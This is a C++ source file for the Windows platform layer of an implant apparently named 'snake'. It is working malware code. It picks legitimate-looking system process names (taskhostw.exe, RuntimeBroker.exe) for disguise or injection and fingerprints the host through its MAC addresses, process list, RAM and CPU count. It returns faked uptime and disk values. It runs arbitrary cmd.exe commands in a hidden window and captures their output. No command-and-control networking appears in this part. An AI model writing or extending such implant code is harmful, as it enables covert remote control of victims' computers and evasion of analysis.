#ifdef _WIN32

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iphlpapi.h>
#include <tlhelp32.h>

#include <chrono>
#include <cstdio>
#include <vector>

#include "snake/implant_platform.hpp"

namespace snake::implant {

namespace {

long long clock_nanos() {
    auto ns = std::chrono::high_resolution_clock::now().time_since_epoch();
    return (long long)std::chrono::duration_cast<std::chrono::nanoseconds>(ns).count();
}

bool pipe_done(HANDLE h) {
    DWORD avail = 0;
    if (PeekNamedPipe(h, nullptr, 0, nullptr, &avail, nullptr)) return false;
    return GetLastError() == ERROR_BROKEN_PIPE || GetLastError() == ERROR_HANDLE_EOF;
}

void drain_pipe(HANDLE h, std::string& into, bool& done) {
    if (done) return;
    DWORD avail = 0;
    if (!PeekNamedPipe(h, nullptr, 0, nullptr, &avail, nullptr)) {
        if (GetLastError() == ERROR_BROKEN_PIPE || GetLastError() == ERROR_HANDLE_EOF) done = true;
        return;
    }
    while (avail > 0) {
        char buf[4096];
        DWORD want = avail > (DWORD)sizeof(buf) ? (DWORD)sizeof(buf) : avail;
        DWORD got = 0;
        if (!ReadFile(h, buf, want, &got, nullptr) || got == 0) break;
        into.append(buf, (size_t)got);
        if (!PeekNamedPipe(h, nullptr, 0, nullptr, &avail, nullptr)) {
            if (GetLastError() == ERROR_BROKEN_PIPE || GetLastError() == ERROR_HANDLE_EOF) done = true;
            return;
        }
    }
    if (avail == 0 && pipe_done(h)) done = true;
}

}  // namespace

std::string hostname() {
    char buf[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD n = sizeof(buf);
    if (GetComputerNameA(buf, &n) == 0) return "";
    return std::string(buf, (size_t)n);
}

std::string target_proc_name() {
    static const char* targets[] = {"taskhostw.exe", "sihost.exe", "dllhost.exe",
                                    "RuntimeBroker.exe", "CompatTelRunner.exe"};
    return targets[unsigned(clock_nanos() % 5)];
}

long long uptime_secs() {
    return 999999;
}

double disk_total_gb() {
    return 999.0;
}

int num_cpu() {
    DWORD n = GetActiveProcessorCount(ALL_PROCESSOR_GROUPS);
    if (n == 0) n = GetActiveProcessorCount(0);
    return n > 0 ? (int)n : 1;
}

int local_hour() {
    SYSTEMTIME st;
    GetLocalTime(&st);
    return (int)st.wHour;
}

long long ram_total_mb() {
    MEMORYSTATUSEX ms{};
    ms.dwLength = sizeof(ms);
    if (!GlobalMemoryStatusEx(&ms)) return 0;
    return (long long)(ms.ullTotalPhys / (1024ULL * 1024ULL));
}

std::vector<std::string> mac_addresses() {
    std::vector<std::string> out;
    ULONG size = 0;
    DWORD flags = GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_DNS_SERVER |
                  GAA_FLAG_SKIP_UNICAST;
    if (GetAdaptersAddresses(AF_UNSPEC, flags, nullptr, nullptr, &size) != ERROR_BUFFER_OVERFLOW ||
        size == 0) {
        return out;
    }
    std::vector<unsigned char> buf(size);
    auto* addrs = (IP_ADAPTER_ADDRESSES*)buf.data();
    if (GetAdaptersAddresses(AF_UNSPEC, flags, nullptr, addrs, &size) != NO_ERROR) return out;
    for (IP_ADAPTER_ADDRESSES* a = addrs; a != nullptr; a = a->Next) {
        if (a->PhysicalAddressLength < 6) continue;
        char mac[32];
        std::snprintf(mac, sizeof(mac), "%02x:%02x:%02x:%02x:%02x:%02x",
                      a->PhysicalAddress[0], a->PhysicalAddress[1], a->PhysicalAddress[2],
                      a->PhysicalAddress[3], a->PhysicalAddress[4], a->PhysicalAddress[5]);
        out.push_back(mac);
    }
    return out;
}

std::vector<std::string> running_process_names() {
    std::vector<std::string> out;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return out;
    PROCESSENTRY32 pe{};
    pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) {
        do {
            if (pe.szExeFile[0] != '\0') out.push_back(pe.szExeFile);
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return out;
}

ShellOutput run_shell(const std::string& cmd) {
    ShellOutput r;

    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;

    HANDLE out_rd = nullptr, out_wr = nullptr, err_rd = nullptr, err_wr = nullptr;
    if (CreatePipe(&out_rd, &out_wr, &sa, 0) == 0) return r;
    if (CreatePipe(&err_rd, &err_wr, &sa, 0) == 0) {
        CloseHandle(out_rd);
        CloseHandle(out_wr);
        return r;
    }
    SetHandleInformation(out_rd, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(err_rd, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
    si.hStdOutput = out_wr;
    si.hStdError = err_wr;

    PROCESS_INFORMATION pi{};
    std::string cl = "cmd.exe /C " + cmd;
    std::vector<char> mutable_cl(cl.begin(), cl.end());
    mutable_cl.push_back('\0');

    BOOL ok = CreateProcessA(nullptr, mutable_cl.data(), nullptr, nullptr, TRUE,
                             CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(out_wr);
    CloseHandle(err_wr);
    if (ok == 0) {
        CloseHandle(out_rd);
        CloseHandle(err_rd);
        return r;
    }
    CloseHandle(pi.hThread);

    const auto deadline = std::chrono::steady_clock::now() + std::chrono::seconds(30);
    bool o_done = false, e_done = false;
    while (!(o_done && e_done)) {
        drain_pipe(out_rd, r.out, o_done);
        drain_pipe(err_rd, r.err, e_done);
        if (o_done && e_done) break;
        if (std::chrono::steady_clock::now() > deadline) {
            r.timed_out = true;
            TerminateProcess(pi.hProcess, 1);
            break;
        }
        Sleep(20);
    }

    if (r.timed_out) {
        drain_pipe(out_rd, r.out, o_done);
        drain_pipe(err_rd, r.err, e_done);
    }

    CloseHandle(out_rd);
    CloseHandle(err_rd);
    if (!r.timed_out) {
        DWORD code = 0;
        GetExitCodeProcess(pi.hProcess, &code);
        r.exit_code = (int)code;
    }
    CloseHandle(pi.hProcess);
    return r;
}

}  // namespace snake::implant

#endif  // _WIN32
